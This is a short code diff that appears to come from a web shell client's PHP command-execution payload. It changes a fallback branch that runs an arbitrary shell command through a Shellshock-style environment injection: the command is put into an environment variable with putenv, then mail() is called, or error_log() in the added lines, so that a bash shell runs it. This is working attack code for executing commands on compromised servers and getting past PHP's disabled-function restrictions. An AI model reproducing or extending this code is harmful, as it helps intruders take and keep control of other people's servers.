@@ -49,11 +49,15 @@ module.exports = (arg1, arg2) => ({
           @proc_close($p);
         }elseif(fe('antsystem')){
           @antsystem($c);
-        }elseif(substr($d,0,1)=="/" && fe('mail') && fe('putenv')){
+        }elseif(substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {
           if(strstr(readlink("/bin/sh"),"bash")!=FALSE){
             $tmp=tempnam(sys_get_temp_dir(), 'as');
             putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
-            mail("a@127.0.0.1", "", "", "", "-bv");
+            if (fe('error_log')) {
+              error_log("a", 1);
+            }else{
+              mail("a@127.0.0.1", "", "", "-bv");
+            }
           }else{
             print("Not vuln (not bash)\n");
           }
